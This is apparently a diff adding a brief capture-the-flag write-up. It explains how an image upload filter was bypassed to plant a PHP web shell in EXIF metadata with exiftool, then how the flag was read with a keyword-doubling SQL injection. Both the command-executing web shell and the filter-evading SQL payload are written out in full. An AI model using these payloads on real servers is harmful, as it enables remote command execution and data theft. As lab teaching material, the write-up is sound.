@@ -1,0 +1,11 @@
+1. In the remote file inclusion problem we have to upload a malicous file in the server.
+2. The only place to upload a file in the server is the settings page to upload the profile picture.
+3. I tried to upload php file but the server is only accepting image input file. 
+4. The php file by changing the extension to jpeg is also uploaded but not accepted instead a message is shown that says the file is not image.
+5. This made me understood that php code must exist within an image.
+6. Exiftool is used to embed php code within a image.
+7. Command used:  exiftool -DocumentName="<h1>RAZZOR<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" image.jpeg
+8. The extension of this image.jpeg file is changed to image.php and uploaded and message poped up that "The file image.php has been uploaded.Agent RFI is successfully planted!".
+9. The flag is found by doing sql injection to read the bio field of Agent RFI.
+10. Sql command: ' uunionnion selselectect null,bio,null,null,null,null,null,null,null,null,null,null,null,null from student whwhereere name='Agent RFI'#
+
